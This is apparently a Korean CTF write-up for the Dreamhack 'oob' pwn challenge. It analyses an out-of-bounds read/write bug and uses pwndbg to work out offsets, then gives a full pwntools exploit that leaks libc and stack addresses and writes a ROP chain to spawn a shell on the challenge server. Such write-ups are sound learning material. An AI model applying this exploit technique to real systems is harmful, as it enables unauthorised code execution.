---
title: "oob writeup"
date: 2026-05-03 23:32:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, rop, oob, dreamhack]
---

## Analysis

### checksec
```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

### Source Code
```c
...
.data:0000000000004010 oob             db 'Hello, World!',0    ; DATA XREF: main+85↑o
...

int menu()
{
  puts("1. read");
  puts("2. write");
  puts("3. exit");
  return printf("> ");
}

int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-14h] BYREF
  _QWORD v5[2]; // [rsp+10h] [rbp-10h] BYREF

  v5[1] = __readfsqword(0x28u);
  initialize(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        if ( v4 != 1 )
          break;
        printf("offset: ");
        __isoc99_scanf("%lld", v5);
        printf("%c\n", (unsigned int)oob[v5[0]]);
      }
      if ( v4 != 2 )
        break;
      printf("offset: ");
      __isoc99_scanf("%lld", v5);
      printf("value: ");
      getchar();
      __isoc99_scanf("%lld", &oob[v5[0]]);
    }
    if ( v4 == 3 )
      break;
    puts("invalid choice");
  }
  return 0;
}
```

소스 코드를 요약하면, 메뉴를 출력하고 사용자 입력을 받아 해당하는 기능을 실행한다. 1, 2번은 추가로 오프셋을 입력받아 전역 변수 `oob`를 기준으로 임의의 위치에 있는 데이터를 1바이트 출력하거나 8바이트를 쓸 수 있게 해준다. 3번은 루프를 탈출하고 프로그램이 종료되도록 한다. 즉, 원하는 메모리 위치를 마음껏 읽거나 쓸 수 있다.

## Vulnerability Analysis

이 프로그램에는 `win`과 같은 함수가 주어지지 않으므로 쉘을 획득하기 위해 먼저 libc base를 유출해야 한다. 스택의 base를 아직 알 수 없기 때문에 `main`의 스택 프레임에 있는 `ret`은 당장 유출할 수 없다. 프로그램은 전역 변수 `oob`를 기준으로 임의 접근을 하는데, `oob`는 `.data` 섹션에 있으며 이는 바이너리에 포함된다. 바이너리 내에서의 거리는 항상 일정하므로 바이너리 안에서 libc를 유출할 방법을 생각해야 하고, 따라서 GOT 엔트리를 유출하면 된다. Full RELRO이므로 아무 엔트리나 유출하면 된다. 여기서는 `__libc_start_main`을 유출한다.

```
pwndbg> got

/pwn/holymoly/oob_patched:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
0000000000003d90 R_X86_64_RELATIVE  *ABS*+0x00000000000011e0
0000000000003d98 R_X86_64_RELATIVE  *ABS*+0x00000000000011a0
0000000000004008 R_X86_64_RELATIVE  *ABS*+0x0000000000004008
0000000000003fd8 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.34
...
pwndbg> p &oob
$1 = (<data variable, no debug info> *) 0x4010 <oob>
pwndbg> p 0x3fd8-0x4010
$2 = -56
```

`oob`에서 `__libc_start_main`까지의 거리는 -56이다.

그러나 결국 쉘을 획득하기 위해서는 `system("/bin/sh")`를 실행해야 하고, `main` 스택 프레임의 `ret`을 덮어써야 한다. 전역 변수 `oob`와 스택 간의 거리를 알아야 하는데, 이를 위해서는 스택 주소를 유출해야 한다. 앞서 libc base를 유출했으므로 `__environ`을 이용할 수 있다. 하지만 이 프로그램은 `oob` 기준 상대 거리로 임의 접근을 하기 때문에, `__environ`의 값인 `envp`를 유출하려면 바이너리 base 유출이 선행되어야 한다.

바이너리 주소 유출은 `.init_array` 혹은 `.fini_array` 섹션을 이용할 수 있다. 이 섹션들에는 바이너리에 있는 함수 포인터들이 존재한다.

```
pwndbg> elf
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End     Perm       Size  Name
    0x555555554616     0x555555554632      R--       0x1c  .gnu.version
    0x555555554638     0x555555554688      R--       0x50  .gnu.version_r
    0x555555554688     0x555555554778      R--       0xf0  .rela.dyn
    0x555555554778     0x555555554808      R--       0x90  .rela.plt
    0x555555555000     0x55555555501b      R-X       0x1b  .init
    0x555555555020     0x555555555090      R-X       0x70  .plt
    0x555555555090     0x5555555550a0      R-X       0x10  .plt.got
    0x5555555550a0     0x555555555100      R-X       0x60  .plt.sec
    0x555555555100     0x5555555553dc      R-X      0x2dc  .text
    0x5555555553dc     0x5555555553e9      R-X        0xd  .fini
    0x555555556000     0x55555555604c      R--       0x4c  .rodata
    0x55555555604c     0x555555556090      R--       0x44  .eh_frame_hdr
    0x555555556090     0x55555555617c      R--       0xec  .eh_frame
    0x555555557d90     0x555555557d98      R--        0x8  .init_array
    0x555555557d98     0x555555557da0      R--        0x8  .fini_array
    0x555555557f90     0x555555558000      R--       0x70  .got
    0x555555558000     0x55555555801e      RW-       0x1e  .data
    0x555555558020     0x555555558040      RW-       0x20  .bss
    0x555555559000     0x555555559200      RW-      0x200  .dynamic
    0x555555559200     0x5555555592e7      RW-       0xe7  .dynstr
    0x5555555592e8     0x555555559438      RW-      0x150  .dynsym
    0x555555559438     0x555555559468      RW-       0x30  .gnu.hash
    0x555555559468     0x555555559475      RW-        0xd  .interp
    0x555555559478     0x555555559498      RW-       0x20  .note.ABI-tag
    0x555555559498     0x5555555594bc      RW-       0x24  .note.gnu.build-id
    0x5555555594c0     0x5555555594f0      RW-       0x30  .note.gnu.property
pwndbg> tele 0x555555557d90
00:0000│         0x555555557d90 (__frame_dummy_init_array_entry) —▸ 0x5555555551e0 (frame_dummy) ◂— endbr64
01:0008│ rcx r14 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
02:0010│         0x555555557da0 ◂— 0x5858585858585858 ('XXXXXXXX')
... ↓            5 skipped
pwndbg> tele 0x555555557d98
00:0000│ rcx r14 0x555555557d98 (__do_global_dtors_aux_fini_array_entry) —▸ 0x5555555551a0 (__do_global_dtors_aux) ◂— endbr64
01:0008│         0x555555557da0 ◂— 0x5858585858585858 ('XXXXXXXX')
... ↓            6 skipped
```

여기서는 `.init_array`의 `frame_dummy`를 유출한다. 오프셋은 `.init_array` 시작 주소에서 `oob` 주소를 빼서 아래와 같이 계산할 수 있다.

```
pwndbg> p 0x555555557d90-0x555555558010
$7 = -640
```

`oob`에서 `frame_dummy`까지의 거리는 -640이다. 이 값으로 바이너리 base를 구한 뒤, `__environ - oob`를 계산해 `oob`와 `__environ` 간의 거리를 얻고, `__environ`이 가리키는 값인 `envp`를 유출할 수 있다.

추가로, 덮어써야 하는 것은 `main` 스택 프레임의 `ret`이므로 `envp`와 `ret` 간의 거리 또한 계산해야 한다.

```
pwndbg> start
   ...
pwndbg> disass main
Dump of assembler code for function main:
   0x000055555555527c <+0>:     endbr64 
   0x0000555555555280 <+4>:     push   rbp
   0x0000555555555281 <+5>:     mov    rbp,rsp
=> 0x0000555555555284 <+8>:     sub    rsp,0x20
   ...
pwndbg> p &__environ
$8 = (<data variable, no debug info> *) 0x7ffff7e21200 <environ>
pwndbg> x/gx 0x7ffff7e21200
0x7ffff7e21200 <environ>:       0x00007fffffffe648
pwndbg> p $rbp+8
$9 = (void *) 0x7fffffffe528
pwndbg> p 0x7fffffffe528-0x00007fffffffe648
$11 = -288
```

이제 `oob`에서 `ret`까지의 거리를 `envp - oob - 288`로 구할 수 있다.

libc base와 바이너리 base를 모두 구하고 `oob`에서 `ret`까지의 거리 계산도 마쳤으므로, libc의 `pop rdi; ret` 가젯을 이용해 `system("/bin/sh")`를 호출하도록 ROP 체인을 구성하면 된다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./oob_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 12932)

    return r

r = conn()

def leak_qword(idx):
    leak = b""
    for i in range(8):
        r.sendlineafter(b"> ", b"1")
        r.sendlineafter(b"offset: ", str(idx + i).encode())
        leak += r.recvline()[:-1]
    return u64(leak)

def write_qword(idx, value):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"offset: ", str(idx).encode())
    r.sendlineafter(b"value: ", str(value).encode())

def main():
    __libc_start_main = leak_qword(-56)
    frame_dummy = leak_qword(-640)

    exe.address = frame_dummy - exe.symbols["frame_dummy"]
    libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
    
    __environ_idx = libc.symbols["__environ"] - exe.symbols["oob"]
    envp = leak_qword(__environ_idx)
    ret_idx = envp - exe.symbols["oob"] - 288

    rdi_gadget = ROP(libc).find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = ROP(exe).find_gadget(["ret"])[0]
    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))

    write_qword(ret_idx, ret_gadget)
    write_qword(ret_idx + 8, rdi_gadget)
    write_qword(ret_idx + 16, binsh)
    write_qword(ret_idx + 24, system)

    r.sendlineafter(b"> ", b"3")

    r.interactive()


if __name__ == "__main__":
    main()
```